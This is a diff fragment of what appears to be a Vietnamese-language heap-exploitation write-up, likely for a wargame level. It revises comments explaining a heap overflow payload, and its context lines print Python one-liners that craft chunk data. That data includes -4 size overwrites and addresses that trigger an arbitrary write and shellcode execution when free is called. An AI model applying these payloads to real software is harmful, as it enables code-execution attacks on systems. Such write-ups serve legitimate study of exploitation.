@@ -305,8 +305,8 @@ a chunk                                    b chunk                              
   - "A"*8: 8 bytes này khi free(a) sẽ bị ghi đè. => để tránh shell code bị ghi đè
   - 6 bytes shell code
 - b: python -c 'print "A"*28 + "\x01\x01\x01\x01" + "\xfc\xff\xff\xff" + "\xfc\xff\xff\xff"'
-  - "A"*28: ghi hết phần data của b chunk
-  - "\x01\x01\x01\x01": bit cuối của số này là 1, tránh consolidate forward
+  - "A"*28: trash
+  - "\x01\x01\x01\x01": ô này là ô size của next next chunk, để bit cuối là 1 sẽ không consolidate forward
   - "\xfc\xff\xff\xff": -4 thứ nhất, ghi lên prev_size của c chunk
   - "\xfc\xff\xff\xff": -4 thứ 2, ghi lên size của c chunk
 - c: python -c 'print "A"*4 + "\x1c\xb1\x04\x08" + "\x10\xc0\x04\x08"'
